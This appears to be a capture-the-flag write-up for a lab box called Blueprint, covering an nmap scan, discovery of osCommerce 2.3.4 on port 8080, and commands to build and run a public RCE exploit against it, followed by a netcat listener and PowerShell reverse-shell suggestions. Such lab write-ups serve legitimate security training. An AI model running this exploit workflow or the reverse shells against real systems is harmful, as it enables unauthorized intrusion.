# Blueprint CTF - Recon & Exploitation

## Summary
This write-up documents the initial reconnaissance and exploit path for the target `10.48.182.77`. The service enumeration revealed a vulnerable `osCommerce 2.3.4` installation on port `8080`, which leads to a remote code execution exploit.

---

## Network Scan
### Nmap command
```bash
sudo nmap $ip -Pn -o nmap.txt
```

### Key findings
- Host: `10.48.182.77`
- Open services: `80`, `135`, `139`, `443`, `445`, `3306`, `8080`, and several high-numbered RPC ports
- Web servers detected:
  - `80/tcp` - Microsoft IIS 7.5
  - `443/tcp` - Apache 2.4.23 with PHP 5.6.28
  - `8080/tcp` - Apache 2.4.23 with `osCommerce 2.3.4`
- SMB information shows a Windows 7 Home Basic host named `BLUEPRINT`
- MySQL port `3306` is open and running `MariaDB 10.3.23 or earlier`

### Web discovery on port 8080
The HTTP server on `8080` exposed a directory listing containing:
- `oscommerce-2.3.4/`
- `oscommerce-2.3.4/catalog/`
- `oscommerce-2.3.4/docs/`

This strongly indicates a vulnerable osCommerce deployment.

---

## Vulnerability
Detected vulnerable application:
- `osCommerce 2.3.4`

This version is known to have remote code execution vulnerabilities.

---

## Exploit Setup
Clone and build the exploit repository:

```bash
git clone https://github.com/whokilleddb/osCommerce-2.3.4-RCE-exploit
cd osCommerce-2.3.4-RCE-exploit/
cargo build --release
```

---

## Exploitation
Run the exploit against the vulnerable endpoint:

```bash
./target/release/oscommerece_exploit -u http://10.48.182.77:8080/oscommerce-2.3.4/catalog/
```

> The exploit should deliver a temporary shell. After that, use a PowerShell-based Base64 reverse shell or Netcat for a more stable interactive session.

---

## Notes
- Keep the temporary shell until you can spawn a fully interactive session.
- Use `nc -lvnp <port>` or PowerShell Base64 payloads for better flexibility.
- This document is intended as a concise reference for the vulnerability and exploit workflow.

